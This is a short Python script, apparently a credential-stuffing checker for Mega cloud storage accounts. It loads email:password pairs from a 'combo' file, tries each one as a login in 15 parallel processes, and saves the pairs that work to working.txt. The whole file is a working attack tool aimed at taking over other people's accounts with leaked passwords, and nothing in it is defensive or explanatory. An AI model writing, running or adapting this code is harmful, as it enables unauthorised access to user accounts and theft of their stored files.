from mega import Mega
import requests # For making web requests
from multiprocessing import Pool # Multi-Threading
from multiprocessing import freeze_support # Windows Support
accounts = [line.rstrip('\n') for line in open("combo.txt", 'r')]
mega = Mega()

def checkAccount(account):
    global mega
    try:
        m = mega.login(account.split(':')[0], account.split(':')[1])
        print("[Good Account] " + account)
        workingfile = open("working.txt", "a")
        workingfile.write(account + "\n")
        workingfile.close()
    except Exception as e:
        print(f"[Bad Account] {account} {str(e)}")

def main():
    numThreads = 15
    freeze_support()

    pool = Pool(int(numThreads))
    pool.map(checkAccount, accounts)

    pool.close()
    pool.join()

if __name__ == "__main__":
    main()
